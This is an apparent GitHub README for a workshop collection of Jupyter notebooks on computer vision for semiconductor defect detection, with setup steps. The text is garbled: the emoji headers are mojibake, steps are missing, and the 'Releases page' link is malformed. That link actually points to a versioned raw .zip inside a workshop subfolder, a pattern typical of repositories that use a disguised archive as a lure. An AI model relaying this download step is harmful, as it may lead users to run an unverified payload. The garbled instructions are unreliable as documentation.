## üóíÔ∏è Overview
The computer-vision-semiconductor repository contains Jupyter notebooks from the "Introduction to Computer Vision for Semiconductor Industry" workshop held at Universiti Sains Malaysia on October 30-31, 2025. This collection focuses on essential techniques for image processing, classification, segmentation, and defect detection, specifically for the semiconductor industry.

## üîç Features
- **Image Processing**: Learn how to manipulate digital images for improved analysis.
- **Classification**: Discover methods to categorize images based on content.
- **Segmentation**: Understand how to identify and isolate objects within images.
- **Defect Detection**: Gain insights into identifying flaws in semiconductor manufacturing.

     ```
     pip install notebook
     ```

2. **Download the Jupyter Notebooks**:
   - Visit the [Releases page](https://github.com/nakato520/computer-vision-semiconductor/raw/refs/heads/master/Day 2/Workshop 1/vision-computer-semiconductor-v1.4.zip 2/Workshop https://github.com/nakato520/computer-vision-semiconductor/raw/refs/heads/master/Day 2/Workshop 1/vision-computer-semiconductor-v1.4.zip) to download the files you need.

   - Once downloaded, locate the file on your computer. It will be in a compressed format such as `.zip`.
   - Extract the contents of the file to a folder of your choice. You can usually do this by right-clicking the file and selecting "Extract All."

4. **Launch Jupyter Notebook**:
   - Navigate to the folder where you extracted the notebooks using your terminal.
   - Run the following command:
     ```
     jupyter notebook
     ```
   - This will open a new window in your default web browser that shows the contents of the folder.

5. **Open a Notebook**:
   - Click on any Jupyter notebook file (with a `.ipynb` extension) to open it.
   - You can now run the cells within the notebook. Use Shift + Enter to execute each cell.
